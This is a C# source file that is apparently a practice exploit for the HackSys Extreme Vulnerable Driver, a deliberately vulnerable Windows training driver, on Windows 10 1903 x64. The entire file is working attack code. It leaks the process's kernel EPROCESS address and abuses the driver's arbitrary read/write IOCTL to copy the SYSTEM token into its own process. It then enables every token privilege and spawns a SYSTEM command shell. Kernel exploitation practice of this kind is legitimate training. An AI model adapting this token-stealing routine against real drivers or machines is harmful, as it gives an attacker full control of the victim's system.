using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ArbitraryReadWrite
{
    class Program
    {
        // Custom Structure
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct TOKEN_OFFSETS
        {
            public int ActiveProcessLinks;
            public int Token;
            public int UniqueProcessId;
        }

        // Windows Definition
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
        {
            public IntPtr Object;
            public long UniqueProcessId;
            public IntPtr HandleValue;
            public int GrantedAccess;
            public short CreatorBackTraceIndex;
            public short ObjectTypeIndex;
            public int HandleAttributes;
            public int Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll")]
        static extern void RtlGetNtVersionNumbers(
            ref int MajorVersion,
            ref int MinorVersion,
            ref int BuildNumber);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            IntPtr pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtQuerySystemInformation(
            uint SystemInformationClass,
            IntPtr SystemInformation,
            int SystemInformationLength,
            ref int ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);

        // Const. for Token Stealing
        static TOKEN_OFFSETS tokenOffsets = new TOKEN_OFFSETS();

        // Helper Functions
        static bool IsWin10x64()
        {
            string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            int MajorVersion = 0;
            int MinorVersion = 0;
            int BuildNumber = 0;
            RtlGetNtVersionNumbers(ref MajorVersion, ref MinorVersion, ref BuildNumber);
            BuildNumber &= 0xFFFF;

            if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 18362 &&
                string.Compare(arch, "amd64", StringComparison.OrdinalIgnoreCase) == 0)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 1903 x64");
                tokenOffsets.ActiveProcessLinks = 0x2f0;
                tokenOffsets.Token = 0x360;
                tokenOffsets.UniqueProcessId = 0x2e8;
                return true;
            }
            else
            {
                Console.WriteLine("[-] Unsupported OS is detected");
                return false;
            }
        }

        static IntPtr GetCurrentEPROCESSAddress()
        {
            int pid = Process.GetCurrentProcess().Id;
            IntPtr ObjectPointer = IntPtr.Zero;
            uint SystemExtendedHandleInformation = 0x40;
            uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
            int STATUS_INFO_LENGTH_MISMATCH = Convert.ToInt32("0xC0000004", 16);
            int STATUS_SUCCESS = 0;
            int ntstatus = STATUS_INFO_LENGTH_MISMATCH;

            Console.WriteLine("[>] Trying to get a process handle of current process");
            IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get a process handle of current process");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                return IntPtr.Zero;
            }

            Console.WriteLine("[+] Got a handle of current process");
            Console.WriteLine("    |-> hProcess: 0x{0}", hProcess.ToString("X"));

            Console.WriteLine("[>] Trying to retrieve system information");

            int SystemInformationLength = 1024;
            IntPtr infoBuffer = IntPtr.Zero;

            while (ntstatus == STATUS_INFO_LENGTH_MISMATCH)
            {
                int ReturnLength = 0;
                infoBuffer = Marshal.AllocHGlobal(SystemInformationLength);

                ntstatus = NtQuerySystemInformation(
                    SystemExtendedHandleInformation, infoBuffer, 
                    SystemInformationLength, ref ReturnLength);

                if (ntstatus == STATUS_INFO_LENGTH_MISMATCH)
                {
                    Marshal.FreeHGlobal(infoBuffer);
                    SystemInformationLength = Math.Max(SystemInformationLength, ReturnLength);
                }
                else if (ntstatus == STATUS_SUCCESS)
                {
                    break;
                }
                else
                {
                    Console.WriteLine("[-] Failed to get system information");
                    Console.WriteLine("    |-> NTSTATUS: {0}", ntstatus);

                    Marshal.FreeHGlobal(infoBuffer);
                    CloseHandle(hProcess);
                    return IntPtr.Zero;
                }
            }

            int EntryCount = Marshal.ReadInt32(infoBuffer);
            Console.WriteLine("[+] Got {0} entries", EntryCount);

            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX entry = new SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX();
            int entrySize = Marshal.SizeOf(entry);
            IntPtr EntryOffsetPointer = new IntPtr(infoBuffer.ToInt64() + IntPtr.Size * 2);
            long UniqueProcessId;
            IntPtr HandleValue;

            Console.WriteLine("[>] Searching our process entry (PID = {0})", pid);

            for (int idx = 0; idx < EntryCount; idx++)
            {
                entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(
                    EntryOffsetPointer, entry.GetType());
                UniqueProcessId = entry.UniqueProcessId;
                HandleValue = entry.HandleValue;

                if (UniqueProcessId == (long)pid && HandleValue == hProcess)
                {
                    ObjectPointer = entry.Object;
                    Console.WriteLine("[+] Got our entry");
                    Console.WriteLine("    |-> Object: 0x{0}", ObjectPointer.ToString("X16"));
                    Console.WriteLine("    |-> UniqueProcessId: {0}", UniqueProcessId);
                    Console.WriteLine("    |-> HandleValue: 0x{0}", HandleValue.ToString("X"));
                }

                EntryOffsetPointer = new IntPtr(EntryOffsetPointer.ToInt64() + entrySize);
            }

            if (ObjectPointer == IntPtr.Zero)
                Console.WriteLine("[-] Failed to get target entry");

            Marshal.FreeHGlobal(infoBuffer);
            CloseHandle(hProcess);

            return ObjectPointer;
        }

        static IntPtr ReadPointer(IntPtr hDevice, IntPtr pTarget)
        {
            uint ioctl = 0x22200B;
            IntPtr result;
            IntPtr inputBuffer = Marshal.AllocHGlobal(IntPtr.Size * 2);
            IntPtr pResult = Marshal.AllocHGlobal(IntPtr.Size);
            IntPtr[] inputArray = new IntPtr[2];
            inputArray[0] = pTarget; // what
            inputArray[1] = pResult; // where
            Marshal.Copy(inputArray, 0, inputBuffer, 2);

            DeviceIoControl(hDevice, ioctl, inputBuffer, (IntPtr.Size * 2),
                IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);

            result = Marshal.ReadIntPtr(pResult);
            Marshal.FreeHGlobal(pResult);
            Marshal.FreeHGlobal(inputBuffer);

            return result;
        }

        static void WritePointer(IntPtr hDevice, IntPtr where, IntPtr what)
        {
            uint ioctl = 0x22200B;
            IntPtr inputBuffer = Marshal.AllocHGlobal(IntPtr.Size * 2);
            IntPtr whatBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.Copy(BitConverter.GetBytes(what.ToInt64()), 0, whatBuffer, IntPtr.Size);
            IntPtr[] inputArray = new IntPtr[2];
            inputArray[0] = whatBuffer; // what
            inputArray[1] = where; // where
            Marshal.Copy(inputArray, 0, inputBuffer, 2);

            DeviceIoControl(hDevice, ioctl, inputBuffer, (IntPtr.Size * 2),
                IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);

            Marshal.FreeHGlobal(whatBuffer);
            Marshal.FreeHGlobal(inputBuffer);
        }

        static void StealSystemToken(IntPtr hDevice, IntPtr EPROCESSPointer)
        {
            IntPtr CurrentEPROCESS = EPROCESSPointer;
            IntPtr CurrentTokenPointer = new IntPtr(EPROCESSPointer.ToInt64() + tokenOffsets.Token);
            IntPtr SystemToken;
            int pid;

            Console.WriteLine("[>] Stealing SYSTEM token");

            while (true)
            {
                pid = (int)(ReadPointer(hDevice, new IntPtr(
                    CurrentEPROCESS.ToInt64() + (Int64)tokenOffsets.UniqueProcessId)).ToInt64() & 
                    0xFFFFFFFF);

                if (pid == 4)
                {
                    SystemToken = ReadPointer(hDevice, new IntPtr(
                        CurrentEPROCESS.ToInt64() + (Int64)tokenOffsets.Token));
                    break;
                }

                CurrentEPROCESS = ReadPointer(hDevice, new IntPtr(
                    CurrentEPROCESS.ToInt64() + (Int64)tokenOffsets.ActiveProcessLinks));
                CurrentEPROCESS = new IntPtr(
                    CurrentEPROCESS.ToInt64() - tokenOffsets.ActiveProcessLinks);
            }

            WritePointer(hDevice, CurrentTokenPointer, SystemToken);

            Console.WriteLine("[>] Enabling all privileges");

            IntPtr CurrentTokenStructureAddress = new IntPtr(
                ReadPointer(hDevice, CurrentTokenPointer).ToInt64() & 
                Convert.ToInt64("0xFFFFFFFFFFFFFFF0", 16));
            IntPtr CurrentPrivileges = ReadPointer(
                hDevice, new IntPtr(CurrentTokenStructureAddress.ToInt64() + 0x40));

            WritePointer(hDevice, new IntPtr(CurrentTokenStructureAddress.ToInt64() + 0x48), 
                CurrentPrivileges);
            WritePointer(hDevice, new IntPtr(CurrentTokenStructureAddress.ToInt64() + 0x50), 
                CurrentPrivileges);
        }

        static bool IsSystem()
        {
            string user = Environment.UserName;

            if (string.Compare(user, "SYSTEM", StringComparison.OrdinalIgnoreCase) == 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        static bool SpawnShell()
        {
            string ApplicationName = "C:\\Windows\\System32\\cmd.exe";
            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
            uint CREATE_NEW_CONSOLE = 0x00000010;
            string CurrentDirectory = "C:\\Windows\\System32";
            STARTUPINFO si = new STARTUPINFO();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            bool status = CreateProcess(
                ApplicationName, null, ref pSec, ref tSec, false,
                CREATE_NEW_CONSOLE, IntPtr.Zero, CurrentDirectory,
                ref si, out PROCESS_INFORMATION pi);

            if (status)
            {
                Console.WriteLine("[+] Shell is spawned successfully (PID = {0})", pi.dwProcessId);
                WaitForSingleObject(pi.hProcess, 500);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            else
            {
                Console.WriteLine("[!] Failed to spawn shell (code={0})", Marshal.GetLastWin32Error());
            }

            return status;
        }

        static void Main()
        {
            Console.WriteLine("--[ HEVD Exploitation : Arbitrary Read Write\n");

            if (!IsWin10x64())
            {
                return;
            }

            // Step 1: Search EPROCESS
            IntPtr eprocessBase = GetCurrentEPROCESSAddress();

            if (eprocessBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find kernel base");
                return;
            }

            // Step 2: Open driver's handle
            string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";
            uint GENERIC_READ = 0x80000000;
            uint GENERIC_WRITE = 0x40000000;
            uint FILE_SHARE_READ = 0x00000001;
            uint FILE_SHARE_WRITE = 0x00000002;
            uint OPEN_EXISTING = 0x3;
            uint FILE_ATTRIBUTE_NORMAL = 0x80;
            uint FILE_FLAG_OVERWRAPPED = 0x40000000;
            IntPtr invalid = new IntPtr(-1);

            Console.WriteLine("[>] Opening {0}", deviceName);
            IntPtr hDevice = CreateFile(
                deviceName, GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERWRAPPED, IntPtr.Zero);

            if (hDevice == invalid)
            {
                Console.WriteLine("[-] Failed to open {0} (code={1})", deviceName, Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] HEVD.sys is opened succesfuly (hDevice = 0x{0})", hDevice.ToString("X"));

            // Step 3: Token Stealing
            StealSystemToken(hDevice, eprocessBase);
            CloseHandle(hDevice);

            // Step 4: Spawn SYSTEM shell
            if (IsSystem() && SpawnShell())
            {
                Console.WriteLine("[+] Exploit is completed successfully");
            }
            else
            {
                Console.WriteLine("[-] Failed to exploit");
            }
        }
    }
}
